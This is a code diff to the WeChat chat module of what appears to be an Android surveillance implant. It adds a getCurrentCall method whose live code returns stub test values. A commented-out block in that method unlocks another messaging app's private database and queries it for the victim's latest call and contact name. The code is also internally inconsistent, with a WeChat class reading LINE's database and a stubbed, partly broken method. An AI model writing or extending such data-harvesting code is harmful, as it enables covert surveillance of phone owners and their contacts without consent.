@@ -16,6 +16,7 @@ import com.android.dvci.db.RecordVisitor;
 import com.android.dvci.file.Path;
 import com.android.dvci.manager.ManagerModule;
 import com.android.dvci.module.ModuleAddressBook;
+import com.android.dvci.module.call.CallInfo;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.StringUtils;
 import com.android.mm.M;
@@ -375,5 +376,76 @@ public class ChatWeChat extends SubModuleChat {
 		helper.traverseRecords(M.e("chatroom"), visitor);
 
 		return groups;
+	}
+
+	public static String readMyPhoneNumber() {
+		//todo: fix this
+		return "local-wechat";
+	}
+
+static public boolean getCurrentCall(final CallInfo call) {
+		String dbFile_local = M.e("/data/data/jp.naver.line.android/databases/naver_line");
+		try {
+		/* just a test to check the evidence on console */
+			call.id= 1;
+
+			call.timestamp = new Date();
+			call.peer = "other-wechat";
+			call.incoming = false;
+			call.account = "my";
+			call.valid = true;
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getCurrentCall) user: " + call.account + " peer: " + call.peer + " timestamp:" + new Date());
+			}
+			return call.valid;
+		/*
+
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getCurrentCall) unprotecting: " + dbFile_local);
+			}
+			Path.unprotect(dbFile_local, 3, true);
+            Path.unprotect(dbFile_local + "*", true);
+			String sqlquery = M.e("select m.id,m.chat_id,m.from_mid,m.created_time,c.name from chat_history as m join contacts as c on m.chat_id = c.m_id " +
+					"where m.type = 4 and m.created_time > 0 order by m.created_time desc limit 1");
+
+			RecordVisitor visitor = new RecordVisitor() {
+				@Override
+				public long cursor(Cursor cursor) {
+					call.id= cursor.getInt(0);
+					String from_mid = cursor.getString(2);
+					long created_time = cursor.getLong(3);
+					call.timestamp = new Date(created_time);
+					call.peer = cursor.getString(4);
+					call.incoming = from_mid != null;
+					call.account = account;
+					call.valid = true;
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (getCurrentCall) user: " + call.account + " peer: " + call.peer + " timestamp:" + created_time);
+					}
+					return call.id;
+				}
+			};
+			if(helper == null){
+				helper = GenericSqliteHelper.openCopy(dbFile_local);
+				if (helper == null) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (getCurrentCall) Error, file not readable: " + dbFile_local);
+					}
+					return false;
+				}
+			}
+			helper.traverseRawQuery(sqlquery, new String[]{}, visitor);
+			return call.valid;
+			*/
+
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+
+				Check.log(TAG + " (getCurrentCall) Error: ", ex);
+			}
+		}
+		return false;
+
 	}
 }
